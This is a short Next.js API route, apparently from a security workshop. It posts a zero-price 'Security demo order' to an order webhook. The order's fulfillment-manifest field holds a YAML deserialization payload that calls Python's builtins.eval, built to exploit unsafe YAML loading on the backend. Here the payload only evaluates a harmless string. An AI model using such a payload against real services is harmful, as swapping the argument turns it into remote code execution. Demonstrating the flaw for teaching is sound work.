import { NextResponse } from "next/server";
import { proxyOrderWebhook } from "@/lib/orderWebhook";

const POISONED_MANIFEST =
  "!!python/object/apply:builtins.eval\nargs: ['\"exploited\"']";

export async function POST() {
  const payload = {
    items: [
      {
        id: "workshop-yaml-chain",
        name: "Security demo order",
        price: 0,
        quantity: 1,
      },
    ],
    subtotal: 0,
    fulfillmentManifest: POISONED_MANIFEST,
  };

  const res = await proxyOrderWebhook("/checkout", {
    method: "POST",
    body: JSON.stringify(payload),
  });
  let data: unknown;
  try {
    data = await res.json();
  } catch {
    data = { detail: await res.text() };
  }
  return NextResponse.json(data, { status: res.status });
}
